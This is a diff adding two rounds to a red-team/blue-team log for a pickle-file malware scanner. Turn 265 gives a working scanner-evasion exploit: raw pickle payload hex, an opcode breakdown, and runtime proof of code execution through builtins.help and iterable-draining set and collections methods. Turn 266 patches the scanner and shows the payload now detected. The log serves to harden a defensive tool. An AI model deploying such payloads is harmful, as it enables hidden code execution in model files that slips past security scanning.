@@ -17265,3 +17265,272 @@ format clean; lint clean; mypy clean across 447 files
 PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
 3797 passed, 1022 skipped, 21 warnings in 54.02s
 ```
+
+## Turn 265 - Bypass via residual iterable mutator descriptors
+
+Offensive turn after the Turn 264 defense. The method-descriptor table fixed the
+exact Turn 263 family but left sibling container mutators with the same source
+semantics: a dotted method descriptor consumes an iterable argument immediately,
+but the native metadata only records the visible descriptor call.
+
+Smallest representative:
+
+```python
+builtins.set.difference(set(), iter(builtins.help, "stop"))
+```
+
+Even with an empty receiver, CPython consumes the iterable operand while
+computing the result. The call iterator invokes `builtins.help()`, which reaches
+`_sitebuiltins._Helper.__call__ -> builtins.__import__`; a shadow `pydoc.py` on
+`sys.path` executes during `pickle.loads`.
+
+Raw payload:
+
+```text
+80048c086275696c74696e738c0469746572938c086275696c74696e738c0468656c70938c0473746f70865294308c086275696c74696e738c0e7365742e646966666572656e636593288f680074522e
+```
+
+Payload shape:
+
+```text
+00: PROTO 4
+18: STACK_GLOBAL builtins.iter
+35: STACK_GLOBAL builtins.help
+42: TUPLE2
+43: REDUCE              # iter(help, "stop")
+44: MEMOIZE
+45: POP
+72: STACK_GLOBAL builtins.set.difference
+74: EMPTY_SET           # receiver self
+75: BINGET 0            # call iterator
+77: TUPLE
+78: REDUCE              # set.difference(set(), call_iterator), drains input
+79: STOP
+```
+
+Scanner proof:
+
+```text
+primary_len 80
+primary_scan clean findings 0 errors ()
+primary_imports [
+  ('builtins', 'iter', 18),
+  ('builtins', 'help', 35),
+  ('builtins', 'set.difference', 72),
+]
+primary_invocations [
+  ('builtins', 'iter', 2, 18, 43),
+  ('builtins', 'set.difference', 2, 72, 78),
+]
+```
+
+Runtime proof:
+
+```text
+primary_runtime_rc 0
+runtime_type set
+runtime_repr set()
+marker_exists True
+marker_text owned-by-set-difference
+primary_runtime_stderr
+```
+
+Sibling probes also stayed scanner-clean while executing the marker:
+
+```text
+set.difference_update len 87 scan clean findings 0
+  invocations [
+    ('builtins', 'iter', 2, 43),
+    ('builtins', 'set.difference_update', 2, 85),
+  ]
+  runtime_stdout None | True
+
+set.symmetric_difference len 90 scan clean findings 0
+  invocations [
+    ('builtins', 'iter', 2, 43),
+    ('builtins', 'set.symmetric_difference', 2, 88),
+  ]
+  runtime_stdout {'owned-value'} | True
+
+set.symmetric_difference_update len 97 scan clean findings 0
+  invocations [
+    ('builtins', 'iter', 2, 43),
+    ('builtins', 'set.symmetric_difference_update', 2, 95),
+  ]
+  runtime_stdout None | True
+
+set.intersection_update len 89 scan clean findings 0
+  invocations [
+    ('builtins', 'iter', 2, 43),
+    ('builtins', 'set.intersection_update', 2, 87),
+  ]
+  runtime_stdout None | True
+
+collections.Counter.update len 107 scan clean findings 0
+  invocations [
+    ('builtins', 'iter', 2, 43),
+    ('collections', 'Counter', 0, 101),
+    ('collections', 'Counter.update', 2, 105),
+  ]
+  runtime_stdout None | True
+
+collections.Counter.subtract len 109 scan clean findings 0
+  invocations [
+    ('builtins', 'iter', 2, 43),
+    ('collections', 'Counter', 0, 103),
+    ('collections', 'Counter.subtract', 2, 107),
+  ]
+  runtime_stdout None | True
+
+collections.OrderedDict.update len 115 scan clean findings 0
+  invocations [
+    ('builtins', 'iter', 2, 43),
+    ('collections', 'OrderedDict', 0, 109),
+    ('collections', 'OrderedDict.update', 2, 113),
+  ]
+  runtime_stdout None | True
+
+collections.UserList.extend len 109 scan clean findings 0
+  invocations [
+    ('builtins', 'iter', 2, 43),
+    ('collections', 'UserList', 0, 103),
+    ('collections', 'UserList.extend', 2, 107),
+  ]
+  runtime_stdout None | True
+
+collections.UserDict.update len 109 scan clean findings 0
+  invocations [
+    ('builtins', 'iter', 2, 43),
+    ('collections', 'UserDict', 0, 103),
+    ('collections', 'UserDict.update', 2, 107),
+  ]
+  runtime_stdout None | True
+
+weakref.WeakSet.update len 99 scan clean findings 0
+  invocations [
+    ('builtins', 'iter', 2, 43),
+    ('weakref', 'WeakSet', 0, 93),
+    ('weakref', 'WeakSet.update', 2, 97),
+  ]
+  runtime_stdout None | True
+```
+
+Why it bypasses:
+
+- Turn 264 added exact descriptor names for the previously proven
+  `set.union`/`set.update`/`set.intersection` shape.
+- `set.difference`, `set.difference_update`,
+  `set.symmetric_difference`, `set.symmetric_difference_update`, and
+  `set.intersection_update` share the same iterable-draining source behavior
+  but are absent from the table.
+- Container-family mutators in `collections` and `weakref` similarly drain
+  iterable arguments through update/extend/subtract methods, but only their
+  constructors were modeled.
+
+Likely source-level defense:
+
+- Extend `method_descriptor_iterable_consumed_callable(...)` by grouping
+  method families, not one-off names from the last exploit:
+  set algebra/update descriptors, mapping update descriptors, sequence
+  extend descriptors, and weak-container update descriptors.
+- Keep the rule reducer-local with exact `(module, name)` matches and argument
+  slots, but populate the table from container semantics rather than exploit
+  chronology.
+
+Performance note:
+
+- The representative payload is 80 bytes.
+- Warm scan median over 1000 runs was `0.000054s`, p95 `0.000056s`, and max
+  `0.000197s`.
+
+## Turn 266 - Defense for residual container mutator descriptors
+
+Defensive follow-up for Turn 265. The fix broadens
+`method_descriptor_iterable_consumed_callable(...)` by container method family
+instead of only the exact names from the prior exploit.
+
+Expanded source-level coverage:
+
+- Full `set` iterable-draining algebra/update descriptors:
+  `difference`, `difference_update`, `intersection`,
+  `intersection_update`, `isdisjoint`, `symmetric_difference`,
+  `symmetric_difference_update`, `union`, and `update`.
+- `frozenset` iterable-draining algebra descriptors:
+  `difference`, `intersection`, `isdisjoint`, `symmetric_difference`, and
+  `union`.
+- `collections` update/extend descriptors:
+  `Counter.update`, `Counter.subtract`, `OrderedDict.update`,
+  `UserDict.update`, `UserList.extend`, and the existing `deque` init/extend
+  family.
+- Weak container update descriptors:
+  `WeakSet.update`, `WeakKeyDictionary.update`, and
+  `WeakValueDictionary.update`.
+
+Regression coverage:
+
+- Expanded the method-descriptor matrix to include the Turn 265
+  `set.difference` representative, residual set methods, frozenset siblings,
+  and collections mutators.
+- Added weakref-specific runtime regressions with weakrefable objects for
+  weak container update methods.
+- Kept the `dict.setdefault` near-match negative clean to ensure non-consuming
+  descriptor calls do not get promoted.
+
+Post-fix scanner proof for the Turn 265 representative:
+
+```text
+payload_len 80
+scan malicious findings 1 errors ()
+imports [
+  ('builtins', 'iter', 18),
+  ('builtins', 'help', 35),
+  ('builtins', 'set.difference', 72),
+]
+invocations [
+  ('builtins', 'iter', 2, 18, 43),
+  ('builtins', 'set.difference', 2, 72, 78),
+  ('builtins', 'help', 0, 35, 78),
+]
+finding DANGEROUS_CALL_GRAPH
+  _sitebuiltins._Helper.__call__ -> builtins.__import__
+```
+
+Runtime proof still executes:
+
+```text
+runtime rc 0
+runtime_type set
+runtime_repr set()
+marker_exists True
+marker_text owned-by-set-difference
+runtime stderr
+```
+
+Performance note:
+
+- The defense remains an exact reducer callable match plus an O(argument
+  count) scan only for variadic set/frozenset methods.
+- Warm post-fix scan timing over 1000 runs: median `0.000118s`, p95
+  `0.000124s`, max `0.000179s`.
+
+Validation:
+
+```text
+cargo test --manifest-path packages/modelaudit-picklescan/Cargo.toml
+78 passed
+
+pytest targeted residual method-descriptor regressions
+28 passed in 0.95s
+
+pytest packages/modelaudit-picklescan/tests/test_call_graph_import_statements.py -q
+99 passed in 2.48s
+
+pytest packages/modelaudit-picklescan/tests/test_call_graph_*.py -q
+137 passed in 4.03s
+
+ruff format/check, mypy
+format applied to 1 test file; lint clean; mypy clean across 447 files
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
+3814 passed, 1022 skipped, 21 warnings in 44.26s
+```
